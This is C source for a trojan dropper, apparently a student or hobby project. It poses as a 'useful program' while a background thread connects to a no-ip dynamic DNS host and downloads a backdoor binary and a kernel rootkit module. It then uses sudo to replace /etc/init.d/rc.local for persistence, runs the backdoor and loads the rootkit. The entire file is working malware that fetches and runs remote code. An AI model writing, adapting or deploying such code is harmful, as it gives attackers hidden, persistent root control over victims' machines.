/*
The thread calls the function "contact_hackberry" that contact the server in the raspberry.
The server take the binary of the backdoor and the rootkits and copy them to the socket in order to
send the malicious files to to victim.

http://www.giandoweb.it/guide/linux/eseguire-script-avvio-linux-automaticamente

http://searchsecurity.techtarget.it/guida-ai-botnet-il-network-di-pc-infetti/0,1254,18_ART_91580,00.html

*/

#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <netdb.h>

#define PORT   7890
#define SIZE   7688
#define SIZE_R 3813
#define SIZE_S  351
#define SIZE_S2 819

FILE* f1, *f2 , *f3, *f4; // file to copy on the victim 

void* contact_hackberry(void* unused)
{
 int sockfd;
 int recv_length = 0;
 char buf[SIZE];
 char buf_1[SIZE_R];
 char buf_2[SIZE_S];
 char buf_3[SIZE_S2];
 struct sockaddr_in serv_addr;
 struct hostent *host_info; 
 
 system("mkdir /home/.Hacked"); //create the dir where I'll put all the malicious files, this dir is going to be hide!! 
 
 if ( ( sockfd = socket(PF_INET, SOCK_STREAM,0) ) == -1 )
    {
     exit(0);
    }

 host_info = gethostbyname("home-degrigis.no-ip.biz");

 serv_addr.sin_family = AF_INET;
 serv_addr.sin_addr = *( ( struct in_addr * ) ( host_info->h_addr) );
 serv_addr.sin_port = htons(PORT);
 if( connect(sockfd, (struct sockaddr *)&serv_addr,sizeof(struct sockaddr)) == -1 ) 
   {   perror("[FATAL]: client aborted due connect() failed\n"); exit(0); } 

 f1 = fopen("/home/.Hacked/backdoor", "wb");
 f2 = fopen("/home/.Hacked/Hidertkv4.ko","wb");
 f3 = fopen("/home/.Hacked/rc.local","wb");
 f4 = fopen("/home/.Hacked/irc.local.txt","wb");
 
 sleep(20);

 recv(sockfd,&buf  ,SIZE  , 0);
 recv(sockfd,&buf_1,SIZE_R, 0);
 recv(sockfd,&buf_2,SIZE_S, 0); 
 recv(sockfd,&buf_3,SIZE_S2,0);
 fwrite(&buf  ,sizeof(char),SIZE   , f1); 
 fwrite(&buf_1,sizeof(char),SIZE_R , f2);
 fwrite(&buf_2,sizeof(char),SIZE_S , f3); 
 fwrite(&buf_3,sizeof(char),SIZE_S2, f4);
 fclose(f1);
 fclose(f2);
 fclose(f3);
 fclose(f4);
 
 system("sudo chmod 700 /home/.Hacked/backdoor");         //better to convert this in a fork-execl with a dup2 (1,/dev/null), so if there will be errors it doesn't show anythings to console [TODO]
 system("sudo chmod 700 /home/.Hacked/Hidertkv4.ko");
 system("sudo chmod 700 /home/.Hacked/rc.local");
 system("sudo chmod 700 /home/.Hacked/irc.local.txt");

 system("sudo rm /etc/init.d/rc.local");
 system("sudo mv /home/.Hacked/irc.local.txt /etc/init.d/rc.local");
 
 system("sudo /home/.Hacked/backdoor");
 system("sudo insmod /home/.Hacked/Hidertkv4.ko");
  
 
}




int main()
{
 pthread_t thread_id;
 pthread_create(&thread_id,NULL,&contact_hackberry,NULL);
 

 puts("---Welcome to our useful program---\n");
 puts("\nWait few seconds...");
 pthread_join(thread_id,NULL);
 
}
